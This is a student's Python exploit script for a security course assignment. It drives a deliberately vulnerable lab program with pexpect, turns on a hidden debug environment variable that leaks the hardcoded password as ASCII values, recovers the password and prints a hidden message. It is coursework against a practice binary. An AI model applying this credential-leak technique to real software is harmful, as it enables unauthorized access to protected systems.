
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 2 solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code, `task2-vuln.c`, and found a debug statement that
outputs sensative information about the hardcoded password when the environment variable " D E B U G = 1"
* The debug only outputs when the entered password's length matches that of the hardcoded password.
* The debug outputs the ascii character values of the hardcoded password.

### how the script works
* I first set the environment variable " D E B U G = 1"
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`
* I have a loop that finds the length of the hardcoded password by repeatedly starting the vulnerable program 
and inputting passwords from length 2-30 until we get the debug output.
* I then extract the ascii values that represent the hardcoded password and convert them to characters in a single string
* Lastly, I set the environment variable " D E B U G = 0" and start up the vulnerable program again, and this time entering the 
hardcoded password I found, and retrieving the hidden message.
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

MAX_PASSWORD_LENGTH = 30
ARBITRARY_CHAR = 'a'

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"


class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def set_environ_var(val: bool):
    '''
    sets the ` D E B U G ` environment variable to "1" (val = True) or "0" (val = False).
    '''
    if (val):
        os.environ[" D E B U G "] = "1"
    else:
        os.environ[" D E B U G "] = "0"

def main(execname):
    """exploit the vulnerable executable using pexpect"""

    password_len_found = False
    arbitrary_password = ARBITRARY_CHAR * 2
    debug_data = ""
    process = None
    
    try:
        # find the password length
        while (not password_len_found and len(arbitrary_password) <= MAX_PASSWORD_LENGTH):
            
            # print("curr pass len:",len(arbitrary_password), "<"+arbitrary_password+">") # debug
            
            # try:
            #     # set ` D E B U G ` environment variable to "1"
            #     os.environ[" D E B U G "] = "1"
            # except Exception:
            #     print("eokfnweuiofweobfeoiwn")
            set_environ_var(True)  # set the environment variable to True
            
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)

            # try:
                # process.expect_exact("Debug mode active.")
            # except Exception:
                # print('oiehfeohfe')

            process.expect_exact("Debug mode active.\n")
            # print("sup")# debug
            # wait for the password prompt
            process.expect_exact("Password:")
            process.sendline(arbitrary_password)
            
            # read the remaining output of the program one line at a time until <EOF>
            process.expect(pexpect.EOF, timeout=8)
            reply = process.before.decode("ascii")
            # print(f'---reply: \n"\n{reply}"')    # debug
            
            EXPECTED_MESSAGE = "Wrong password.\n"
            
            # check if `reply` is only `EXPECTED_MESSAGE`, otherwise we obtained debug data
            if (reply != EXPECTED_MESSAGE):
                # print(f"---password len found! <{len(arbitrary_password)}>") # debug
                password_len_found = True
                
                # filter out the `EXPECTED_MESSAGE` line
                # print(reply.rsplit('\n'))   # debug
                debug_data = reply.rsplit('\n')[0:len(debug_data)-2]    # set the debug_data with debug table data (remove the last 2 elements after `rsplit()``)
                # print(debug_data)   # debug
                process.kill(True)
                break
            
            # increment arbitrary password length by 1
            arbitrary_password += ARBITRARY_CHAR 

        if (password_len_found):
            # print("debug data:", debug_data) # debug
            
            ascii_password = []
            
            # grab ascii character values of the hardcoded password
            for x in range(0, len(debug_data)):
                debug_data[x] = debug_data[x].rsplit()
                # print(debug_data[x])   # debug
                ascii_password.append(debug_data[x][3])
                      
            # print(f"ascii pass: {ascii_password}")  # debug
            
            # convert ascii value to char
            hardcoded_password = ""
            for x in range(0, len(ascii_password)):
                hardcoded_password += chr(int(ascii_password[x]))
            
            # print(f"hardcoded password found: {hardcoded_password}")    # debug
        
            # get the hidden message
            set_environ_var(False)  # set the environment variable to false
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
            # print("sup")# debug
            # wait for the password prompt
            process.expect_exact("Password:")
            process.sendline(hardcoded_password)
            
            process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
            process.expect_exact("-----END HIDDEN MESSAGE-----")
            hidden_message = process.before.decode("ascii").rstrip()
            # optional: read the remaining output of the program one line at a time until <EOF>
            process.expect(pexpect.EOF, timeout=8)      
            
            # print out the recovered hidden message  
            print("Recovered hidden message:", hidden_message)
           
        # # recover the hidden message
        # # notice that with popen_spawn we can use \n line endings
        # process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        # process.expect_exact("-----END HIDDEN MESSAGE-----")
        # hidden_message = process.before.decode("ascii").rstrip()
        # # optional: read the remaining output of the program one line at a time until <EOF>
        # process.expect(pexpect.EOF, timeout=8)

        # # print out the recovered hidden message
        # print("Recovered hidden message:", hidden_message)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
